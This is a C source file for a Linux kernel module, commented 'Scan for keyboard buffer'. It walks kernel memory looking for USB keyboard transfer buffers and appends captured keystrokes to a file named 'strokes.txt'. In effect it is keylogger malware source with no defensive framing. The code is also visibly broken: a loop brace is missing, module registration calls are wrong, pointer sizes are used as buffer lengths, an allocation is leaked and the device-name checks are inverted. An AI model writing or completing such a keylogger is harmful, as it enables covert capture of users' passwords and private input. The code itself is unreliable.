/* Scan for keyboard buffer */

#include <linux/usb.h>
#include <linux/module.h>
#include <linux/file.h>
#include <linux/fs.h>

#define x(y) ((void *)((uint32_t)(y)+PAGE_OFFSET))
#define BEGIN_KMEM { mm_segment_t old_fs = get_fs(); set_fs(get_ds());
#define END_KMEM set_fs(old_fs); }
#define log "strokes.txt"
#define write(f, buf, sz) (f->f_op->write(f, buf, sz, &f->f_pos))
#define writable(f) (f->f_op && f->f_op->write)

static int write_to_file(char* logfile, char* buf, int size){
    int ret = 0;
    struct file * f = NULL;
    BEGIN_KMEM;
    f = filp_open(logfile, O_CREAT|O_APPEND, 00600);
    if(IS_ERR(f)){
        printk(KERN_INFO "Error %ld opening %s\n", -PTR_ERR(f), logfile);
        ret = -1;
    } else{
        if(writable(f))
            write(f, buf, size);
        else{
            printk(KERN_INFO "%s does not have a write method\n", logfile);
            ret = -1;
        }
        if((ret = filp_close(f,NULL)))
            printk("Error %d closing %s\n", -ret, logfile);
    }
    END_KMEM;

    return ret;
}

static int __init scan_start(void){
unsigned long long i;

for(i = 0; i < ULLONG_MAX; i += 0x10){
    struct urb *urbp = (struct urb *)x(i);
    if(((urbp->dev % 0x400) == 0) &&
       ((urbp->transfer_dma % 0x20) == 0) &&
       (urbp->transfer_buffer_length == 8) &&
       (urbp->transfer_buffer != NULL) &&
       strncmp(urbp->dev->product, "usb", 32) &&
       strncmp(urbp->dev->product, "keyboard", 32)){
           // found possible keyboard buffer
	   char* kbuf = (char *) kmalloc(sizeof(urbp->transfer_buffer), GFP_KERNEL);
	   kbuf = urbp->transfer_buffer;
	   write_to_file(log, kbuf, sizeof(kbuf));
           char* newline = "\n";
	   write_to_file(log, newline, sizeof(newline));
       }
}

static void __exit scan_end(void){
    // do something
}

init_module(scan_start);
exit_module(scan_end);
